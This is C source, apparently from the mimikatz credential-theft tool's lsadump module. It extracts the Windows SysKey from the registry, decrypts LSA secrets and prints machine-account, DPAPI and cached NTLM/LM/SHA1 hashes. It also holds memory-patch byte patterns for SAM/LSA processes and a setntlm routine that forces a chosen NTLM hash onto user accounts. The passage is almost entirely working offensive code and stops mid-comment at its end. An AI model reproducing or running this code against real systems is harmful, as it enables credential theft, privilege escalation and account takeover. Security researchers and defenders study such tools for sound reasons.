/*	Benjamin DELPY `gentilkiwi`
	blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_lsadump.h"

const KUHL_M_C kuhl_m_c_lsadump[] = {
	{kuhl_m_lsadump_setntlm,	L"setntlm",		L"Ask a server to set a new password/ntlm for one user"},
};

const KUHL_M kuhl_m_lsadump = {
	L"lsadump", L"LsaDump module", NULL,
	ARRAYSIZE(kuhl_m_c_lsadump), kuhl_m_c_lsadump, NULL, NULL
};

const wchar_t * kuhl_m_lsadump_CONTROLSET_SOURCES[] = {L"Current", L"Default"};
BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet)
{
	BOOL status = FALSE;
	HKEY hSelect;
	DWORD i, szNeeded, controlSet;

	wchar_t currentControlSet[] = L"ControlSet000";

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
	{
		for(i = 0; !status && (i < ARRAYSIZE(kuhl_m_lsadump_CONTROLSET_SOURCES)); i++)
		{
			szNeeded = sizeof(DWORD); 
			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
		}

		if(status)
		{
			status = FALSE;
			if(swprintf_s(currentControlSet + 10, 4, L"%03u", controlSet) != -1)
				status = kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, currentControlSet, 0, KEY_READ, phCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hRegistry, hSelect);
	}
	return status;
}

const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = {L"JD", L"Skew1", L"GBG", L"Data"};
const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey)
{
	BOOL status = TRUE;
	DWORD i;
	HKEY hKey;
	wchar_t buffer[8 + 1];
	DWORD szBuffer;
	BYTE buffKey[SYSKEY_LENGTH];

	for(i = 0 ; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
	{
		status = FALSE;
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
		{
			szBuffer = 8 + 1;
			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
				status = swscanf_s(buffer, L"%x", (DWORD *) &buffKey[i*sizeof(DWORD)]) != -1;
			kull_m_registry_RegCloseKey(hRegistry, hKey);
		}
		else PRINT_ERROR(L"LSA Key Class read error\n");
	}
	
	if(status)
		for(i = 0; i < SYSKEY_LENGTH; i++)
			sysKey[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];	

	return status;
}

BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey)
{
	BOOL status = FALSE;
	PVOID computerName;
	HKEY hCurrentControlSet, hComputerNameOrLSA;

	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
	{
		kprintf(L"Domain : ");
		if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", L"ComputerName", NULL, &computerName, NULL))
		{
			kprintf(L"%s\n", computerName);
			LocalFree(computerName);
		}

		kprintf(L"SysKey : ");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\LSA", 0, KEY_READ, &hComputerNameOrLSA))
		{
			if(status = kuhl_m_lsadump_getSyskey(hRegistry, hComputerNameOrLSA, sysKey))
			{
				kull_m_string_wprintf_hex(sysKey, SYSKEY_LENGTH, 0);
				kprintf(L"\n");
			}
			else PRINT_ERROR(L"kuhl_m_lsadump_getSyskey KO\n");
			kull_m_registry_RegCloseKey(hRegistry, hComputerNameOrLSA);
		}
		else PRINT_ERROR(L"kull_m_registry_RegOpenKeyEx LSA KO\n");

		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
	}
	return status;
}

const BYTE kuhl_m_lsadump_qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const BYTE kuhl_m_lsadump_01234567890123[] = "0123456789012345678901234567890123456789";

BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN LPCWSTR littleKey, IN LPCWSTR prefix)
{
	BOOL status = FALSE;
	wchar_t name[] = L"Pol__DmN", sid[] = L"Pol__DmS";
	PVOID buffer;
	LSA_UNICODE_STRING uString = {0, 0, NULL};

	RtlCopyMemory(&name[3], littleKey, 2*sizeof(wchar_t));
	RtlCopyMemory(&sid[3], littleKey, 2*sizeof(wchar_t));
	kprintf(L"%s name : ", prefix);
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, name, NULL, NULL, &buffer, NULL))
	{
		uString.Length = ((PUSHORT) buffer)[0];
		uString.MaximumLength = ((PUSHORT) buffer)[1];
		uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
		kprintf(L"%wZ", &uString);
		LocalFree(buffer);
	}
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, sid, NULL, NULL, &buffer, NULL))
	{
		kprintf(L" ( ");
		kull_m_string_displaySID((PSID) buffer);
		kprintf(L" )");
		LocalFree(buffer);
	}
	kprintf(L"\n");
	return status;
}

BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique)
{
	BOOL status = FALSE;
	HKEY hSecrets, hSecret, hCurrentControlSet, hServiceBase;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
	PVOID pSecret;
	wchar_t * secretName;

	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets", 0, KEY_READ, &hSecrets))
	{
		if(kuhl_m_lsadump_getCurrentControlSet(hSystem, hSystemBase, &hCurrentControlSet))
		{
			if(kull_m_registry_RegOpenKeyEx(hSystem, hCurrentControlSet, L"services", 0, KEY_READ, &hServiceBase))
			{
				if(kull_m_registry_RegQueryInfoKey(hSecurity, hSecrets, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szSecretName = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hSecurity, hSecrets, i, secretName, &szSecretName, NULL, NULL, NULL, NULL))
							{
								kprintf(L"\nSecret  : %s", secretName);

								if(_wcsnicmp(secretName, L"_SC_", 4) == 0)
									kuhl_m_lsadump_getInfosFromServiceName(hSystem, hServiceBase, secretName + 4);

								if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecrets, secretName, 0, KEY_READ, &hSecret))
								{
									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"CurrVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
									{
										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/", secretName);
										LocalFree(pSecret);
									}
									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"OldVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
									{
										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/", secretName);
										LocalFree(pSecret);
									}
									kull_m_registry_RegCloseKey(hSecurity, hSecret);
								}
								kprintf(L"\n");
							}
						}
						LocalFree(secretName);
					}
				}
				kull_m_registry_RegCloseKey(hSystem, hServiceBase);
			}
			kull_m_registry_RegCloseKey(hSystem, hCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hSecurity, hSecrets);
	}
	return status;
}
void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version)
{
	//DWORD i;
	MSCACHE_ENTRY_PTR ptr;
	ptr.UserName.Buffer = (PWSTR) ((PBYTE) entry->enc_data + sizeof(MSCACHE_DATA));
	ptr.UserName.Length = ptr.UserName.MaximumLength = entry->szUserName;
	ptr.Domain.Buffer = (PWSTR) ((PBYTE) ptr.UserName.Buffer + SIZE_ALIGN(entry->szUserName, 4));
	ptr.Domain.Length = ptr.Domain.MaximumLength = entry->szDomainName;
	//ptr.DnsDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Domain.Buffer + SIZE_ALIGN(entry->szDomainName, 4));
	//ptr.DnsDomainName.Length = ptr.DnsDomainName.MaximumLength = entry->szDnsDomainName;
	//ptr.Upn.Buffer = (PWSTR) ((PBYTE) ptr.DnsDomainName.Buffer + SIZE_ALIGN(entry->szDnsDomainName, 4));
	//ptr.Upn.Length = ptr.Upn.MaximumLength = entry->szupn;
	//ptr.EffectiveName.Buffer = (PWSTR) ((PBYTE) ptr.Upn.Buffer + SIZE_ALIGN(entry->szupn, 4));
	//ptr.EffectiveName.Length = ptr.EffectiveName.MaximumLength = entry->szEffectiveName;
	//ptr.FullName.Buffer = (PWSTR) ((PBYTE) ptr.EffectiveName.Buffer + SIZE_ALIGN(entry->szEffectiveName, 4));
	//ptr.FullName.Length = ptr.FullName.MaximumLength = entry->szFullName;
	//ptr.LogonScript.Buffer = (PWSTR) ((PBYTE) ptr.FullName.Buffer + SIZE_ALIGN(entry->szFullName, 4));
	//ptr.LogonScript.Length = ptr.LogonScript.MaximumLength = entry->szlogonScript;
	//ptr.ProfilePath.Buffer = (PWSTR) ((PBYTE) ptr.LogonScript.Buffer + SIZE_ALIGN(entry->szlogonScript, 4));
	//ptr.ProfilePath.Length = ptr.ProfilePath.MaximumLength = entry->szprofilePath;
	//ptr.HomeDirectory.Buffer = (PWSTR) ((PBYTE) ptr.ProfilePath.Buffer + SIZE_ALIGN(entry->szprofilePath, 4));
	//ptr.HomeDirectory.Length = ptr.HomeDirectory.MaximumLength = entry->szhomeDirectory;
	//ptr.HomeDirectoryDrive.Buffer = (PWSTR) ((PBYTE) ptr.HomeDirectory.Buffer + SIZE_ALIGN(entry->szhomeDirectory, 4));
	//ptr.HomeDirectoryDrive.Length = ptr.HomeDirectoryDrive.MaximumLength = entry->szhomeDirectoryDrive;
	//ptr.Groups = (PGROUP_MEMBERSHIP) ((PBYTE) ptr.HomeDirectoryDrive.Buffer + SIZE_ALIGN(entry->szhomeDirectoryDrive, 4));
	//ptr.LogonDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Groups + SIZE_ALIGN(entry->groupCount * sizeof(GROUP_MEMBERSHIP), 4));
	//ptr.LogonDomainName.Length = ptr.LogonDomainName.MaximumLength = entry->szlogonDomainName;

	//kprintf(L"UserName     : %wZ\n", &ptr.UserName);
	//kprintf(L"Domain       : %wZ\n", &ptr.Domain);
	//kprintf(L"DnsDomainName: %wZ\n", &ptr.DnsDomainName);
	//kprintf(L"Upn          : %wZ\n", &ptr.Upn);
	//kprintf(L"EffectiveName: %wZ\n", &ptr.EffectiveName);
	//kprintf(L"FullName     : %wZ\n", &ptr.FullName);
	//kprintf(L"LogonScript  : %wZ\n", &ptr.LogonScript);
	//kprintf(L"ProfilePath  : %wZ\n", &ptr.ProfilePath);
	//kprintf(L"HomeDirectory: %wZ\n", &ptr.HomeDirectory);
	//kprintf(L"HomeDirectoryDrive: %wZ\n", &ptr.HomeDirectoryDrive);
	//kprintf(L"Groups       :");
	//for(i = 0; i < entry->groupCount; i++)
	//	kprintf(L" %u", ptr.Groups[i].RelativeId);
	//kprintf(L"\n");
	//kprintf(L"LogonDomainName: %wZ\n", &ptr.LogonDomainName);
	//kprintf(L"sidCount: %u\n", entry->sidCount);
	kprintf(L"User      : %wZ\\%wZ\n", &ptr.Domain, &ptr.UserName);
	kprintf(L"MsCacheV%c : ", version); kull_m_string_wprintf_hex(((PMSCACHE_DATA) entry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
}

DECLARE_CONST_UNICODE_STRING(NTLM_PACKAGE_NAME, L"NTLM");
DECLARE_CONST_UNICODE_STRING(LSACRED_PACKAGE_NAME, LSA_CREDENTIAL_KEY_PACKAGE_NAME);
void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
{
	DWORD szNeeded;
	LPVOID objectName;
	if(kull_m_registry_OpenAndQueryWithAlloc(hSystem, hSystemBase, serviceName, L"ObjectName", NULL, &objectName, &szNeeded))
	{
		kprintf(L" / service \'%s\' with username : %.*s", serviceName, szNeeded / sizeof(wchar_t), objectName);
		LocalFree(objectName);
	}
}

BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN LPCWSTR KeyName, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique, IN PVOID * pBufferOut, IN PDWORD pSzBufferOut)
{
	BOOL status = FALSE;
	DWORD szSecret = 0;
	PVOID secret;
	DATA_KEY key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};
	CRYPT_BUFFER data, output = {0, 0, NULL};

	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hSecret, KeyName, NULL, NULL, &secret, &szSecret))
	{
		if(lsaKeysStream)
		{
			if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) secret, szSecret, lsaKeysStream, NULL))
			{
				*pSzBufferOut = ((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize;
				if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
				{
					status = TRUE;
					RtlCopyMemory(*pBufferOut, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, *pSzBufferOut);
				}
			}
		}
		else if(lsaKeyUnique)
		{
			key.Buffer = lsaKeyUnique->key;
			data.Length = data.MaximumLength = ((PNT5_HARD_SECRET) secret)->encryptedStructSize;
			data.Buffer = (PBYTE) secret + szSecret - data.Length; // dirty hack to not extract x64/x86 from REG ; // ((PNT5_HARD_SECRET) secret)->encryptedSecret;
			if(RtlDecryptData(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
			{
				if(output.Buffer = (PBYTE) LocalAlloc(LPTR, output.Length))
				{
					output.MaximumLength = output.Length;
					if(NT_SUCCESS(RtlDecryptData(&data, &key, &output)))
					{
						*pSzBufferOut = output.Length;
						if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
						{
							status = TRUE;
							RtlCopyMemory(*pBufferOut, output.Buffer, *pSzBufferOut);
						}
					}
					LocalFree(output.Buffer);
				}
			}
		}
		LocalFree(secret);
	}
	return status;
}

void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName)
{
	UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
	BOOL isStringOk = FALSE;
	PVOID bufferHash[SHA_DIGEST_LENGTH]; // ok for NTLM too
	PKIWI_TBAL_MSV pTbal;

	if(bufferSecret && szBytesSecrets)
	{
		kprintf(L"%s", prefix);
		if(szBytesSecrets <= USHRT_MAX)
			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString))
				kprintf(L"text: %wZ", &candidateString);

		if(!isStringOk)
		{
			kprintf(L"hex : ");
			kull_m_string_wprintf_hex(bufferSecret, szBytesSecrets, 1);
		}

		if(_wcsicmp(secretName, L"$MACHINE.ACC") == 0)
		{
			if(kull_m_crypto_hash(CALG_MD4, bufferSecret, szBytesSecrets, bufferHash, MD4_DIGEST_LENGTH))
			{
				kprintf(L"\n    NTLM:");
				kull_m_string_wprintf_hex(bufferHash, MD4_DIGEST_LENGTH, 0);
			}
			if(kull_m_crypto_hash(CALG_SHA1, bufferSecret, szBytesSecrets, bufferHash, SHA_DIGEST_LENGTH))
			{
				kprintf(L"\n    SHA1:");
				kull_m_string_wprintf_hex(bufferHash, SHA_DIGEST_LENGTH, 0);
			}
		}
		else if((_wcsicmp(secretName, L"DPAPI_SYSTEM") == 0) && (szBytesSecrets == sizeof(DWORD) + 2 * SHA_DIGEST_LENGTH))
		{
			kprintf(L"\n    full: ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), 2 * SHA_DIGEST_LENGTH, 0);
			kprintf(L"\n    m/u : ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), SHA_DIGEST_LENGTH, 0);
			kprintf(L" / ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD) + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, 0);
		}
		else if(_wcsnicmp(secretName, L"M$_MSV1_0_TBAL_PRIMARY_", 23) == 0)
		{
			pTbal = (PKIWI_TBAL_MSV) bufferSecret;
			kprintf(L"   User   : %.*s\n    Domain : %.*s", pTbal->UserName.Length / sizeof(wchar_t), (PBYTE) pTbal + pTbal->UserName.Buffer, pTbal->DomainName.Length / sizeof(wchar_t), (PBYTE) pTbal + pTbal->DomainName.Buffer);
			if(pTbal->flags & 1)
			{
				kprintf(L"\n    * NTLM : ");
				kull_m_string_wprintf_hex(pTbal->NtOwfPassword, sizeof(pTbal->NtOwfPassword), 0);
			}
			if(pTbal->flags & 2)
			{
				kprintf(L"\n    * LM   : ");
				kull_m_string_wprintf_hex(pTbal->LmOwfPassword, sizeof(pTbal->LmOwfPassword), 0);
			}
			if(pTbal->flags & 4)
			{
				kprintf(L"\n    * SHA1 : ");
				kull_m_string_wprintf_hex(pTbal->ShaOwPassword, sizeof(pTbal->ShaOwPassword), 0);
			}
			if(pTbal->flags & 8)
			{
				kprintf(L"\n    * DPAPI: ");
				kull_m_string_wprintf_hex(pTbal->DPAPIProtected, sizeof(pTbal->DPAPIProtected), 0);
			}
		}
	}
}

BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecretBlobSize, PNT6_SYSTEM_KEYS lsaKeysStream, PBYTE sysKey)
{
	BOOL status = FALSE;
	BYTE keyBuffer[AES_256_KEY_SIZE];
	DWORD i, offset, szNeeded;
	HCRYPTPROV hContext;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	PBYTE pKey = NULL;
	PNT6_SYSTEM_KEY lsaKey;

	if(lsaKeysStream)
	{
		for(i = 0, offset = 0; i < lsaKeysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + lsaKey->KeySize)
		{
			lsaKey = (PNT6_SYSTEM_KEY) ((PBYTE) lsaKeysStream->Keys + offset);
			if(RtlEqualGuid(&hardSecretBlob->KeyId, &lsaKey->KeyId))
			{
				pKey = lsaKey->Key;
				szNeeded = lsaKey->KeySize;
				break;
			}
		}
	}
	else if(sysKey)
	{
		pKey = sysKey;
		szNeeded = SYSKEY_LENGTH;
	}

	if(pKey)
	{
		if(CryptAcquireContext(&hContext, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
		{
			if(CryptCreateHash(hContext, CALG_SHA_256, 0, 0, &hHash))
			{
				CryptHashData(hHash, pKey, szNeeded, 0);
				for(i = 0; i < 1000; i++)
					CryptHashData(hHash, hardSecretBlob->lazyiv, LAZY_NT6_IV_SIZE, 0);
				
				szNeeded = sizeof(keyBuffer);
				if(CryptGetHashParam(hHash, HP_HASHVAL, keyBuffer, &szNeeded, 0))
				{
					if(kull_m_crypto_hkey(hContext, CALG_AES_256, keyBuffer, sizeof(keyBuffer), 0, &hKey, NULL))
					{
						i = CRYPT_MODE_ECB;
						if(CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE) &i, 0))
						{
							szNeeded = hardSecretBlobSize - FIELD_OFFSET(NT6_HARD_SECRET, encryptedSecret);
							status = CryptDecrypt(hKey, 0, FALSE, 0, hardSecretBlob->encryptedSecret, &szNeeded);
							if(!status)
								PRINT_ERROR_AUTO(L"CryptDecrypt");
						}
						else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
						CryptDestroyKey(hKey);
					}
					else PRINT_ERROR_AUTO(L"kull_m_crypto_hkey");
				}
				CryptDestroyHash(hHash);
			}
			CryptReleaseContext(hContext, 0);
		}
	}
	return status;
}

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0x49, 0x8d, 0x41, 0x20};
BYTE PATC_WIN5_NopNop[]								= {0x90, 0x90};
BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
KULL_M_PATCH_GENERIC SamSrvReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WIN5_NopNop),		PATC_WIN5_NopNop},		{-17}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-19}},
	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0xc6, 0x40, 0x22, 0x00, 0x8b};
BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
KULL_M_PATCH_GENERIC SamSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
};
#endif

BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
};
#endif

NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR systemName, PCWSTR secretName, PUNICODE_STRING secret, BOOL isSecret)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	LSA_OBJECT_ATTRIBUTES oa = {0};
	LSA_HANDLE hPolicy, hSecret;
	UNICODE_STRING name, system, *cur, *old;
	LARGE_INTEGER curDate, oldDate;

	if(secretName)
	{
		RtlInitUnicodeString(&name, secretName);
		RtlInitUnicodeString(&system, systemName);
		status = LsaOpenPolicy(&system, &oa, POLICY_GET_PRIVATE_INFORMATION, &hPolicy);
		if(NT_SUCCESS(status))
		{
			if(!isSecret)
			{
				status = LsaRetrievePrivateData(hPolicy, &name, &cur);
				if(NT_SUCCESS(status))
				{
					if(cur)
					{
						*secret = *cur;
						if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
							RtlCopyMemory(secret->Buffer, cur->Buffer, secret->MaximumLength);
						LsaFreeMemory(cur);
					}
				}
			}
			else
			{
				status = LsaOpenSecret(hPolicy, &name, SECRET_QUERY_VALUE, &hSecret);
				if(NT_SUCCESS(status))
				{
					status = LsaQuerySecret(hSecret, &cur, &curDate, &old, &oldDate);
					if(NT_SUCCESS(status))
					{
						if(cur)
						{
							*secret = *cur;
							if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
								RtlCopyMemory(secret->Buffer, cur->Buffer, secret->MaximumLength);
							LsaFreeMemory(cur);
						}
						if(old)
							LsaFreeMemory(old);
					}
					LsaClose(hSecret);
				}
			}
			LsaClose(hPolicy);
		}
	}
	return status;
}
NTSTATUS CALLBACK kuhl_m_lsadump_setntlm_callback(SAMPR_HANDLE hUser, PVOID pvArg)
{
	NTSTATUS status = SamSetInformationUser(hUser, UserInternal1Information, (PSAMPR_USER_INFO_BUFFER) pvArg);
	if(NT_SUCCESS(status))
		kprintf(L"\n>> Informations are in the target SAM!\n");
	else PRINT_ERROR(L"SamSetInformationUser: %08x\n", status);
	return status;
}

NTSTATUS kuhl_m_lsadump_setntlm(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	LSA_UNICODE_STRING password;
	PCWCHAR szPassword;
	SAMPR_USER_INFO_BUFFER infos = {{{0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}, {0x7c, 0x1c, 0x15, 0xe8, 0x74, 0x11, 0xfb, 0xa2, 0x1d, 0x91, 0xa0, 0x81, 0xd4, 0xb3, 0x78, 0x61}, TRUE, FALSE, FALSE, FALSE,}};

	if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
	{
		RtlInitUnicodeString(&password, szPassword);
		status = RtlCalculateNtOwfPassword(&password, infos.Internal1.NTHash);
		if(!NT_SUCCESS(status))
			PRINT_ERROR(L"Unable to digest NTLM hash from password: %08x\n", status);
	}
	else if(kull_m_string_args_byName(argc, argv, L"ntlm", &szPassword, NULL))
	{
		status = kull_m_string_stringToHex(szPassword, infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
		if(!NT_SUCCESS(status))
			PRINT_ERROR(L"Unable to convert \'%s\' to NTLM hash (16 bytes)\n", szPassword);
	}
	else
	{
		kprintf(L"** No credentials provided, will use the default one **\n");
		infos.Internal1.LmPasswordPresent = TRUE;
		status = STATUS_SUCCESS;
	}

	if(NT_SUCCESS(status))
	{
		kprintf(L"NTLM         : ");
		kull_m_string_wprintf_hex(infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash), 0);
		kprintf(L"\n\n");
		status = kuhl_m_lsadump_enumdomains_users(argc, argv, USER_FORCE_PASSWORD_CHANGE, kuhl_m_lsadump_setntlm_callback, &infos);
	}
	return STATUS_SUCCESS;
}

/*	This function `changentlm` is based on another crazy idea of
